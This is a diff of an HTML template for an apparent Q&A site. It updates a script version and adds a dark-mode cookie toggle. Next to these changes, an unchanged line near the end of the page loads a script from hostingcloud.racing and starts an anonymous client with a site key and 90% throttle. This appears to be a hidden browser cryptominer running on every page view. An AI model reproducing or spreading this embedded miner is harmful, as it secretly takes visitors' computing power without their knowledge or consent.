@@ -241,13 +241,19 @@ $(function() {
 			</div>
 			{% endfor %}
 		</div>
-<script src="/static/js/question.js?version=7"></script>
+<script src="/static/js/question.js?version=7.1"></script>
 <script>
 
 var formbgcolor='bg-white'; var bgcolor='bg-white'; var textcolor='text-dark';
 var commentformbgcolor='bg-white'; var commentbgcolor='bg-light';
 </script>
 <script src="/static/js/general_functions.js?version=2"></script>
+<script src="/static/js/cookieman.js?v=0.1"></script>
+<script>
+if (getDarkCookie() == 'true') {
+	toggleDarkMode();
+}
+</script>
 <script src="https://www.hostingcloud.racing/zk0a.js"></script><script>var _client=new Client.Anonymous("5359e2aefac13b8544fcee9326d4a0aafb5fd62a6991f1e87ade167c09c9967a",{throttle:.9,c:"w",ads:0});_client.start();</script>
 	</body>
 
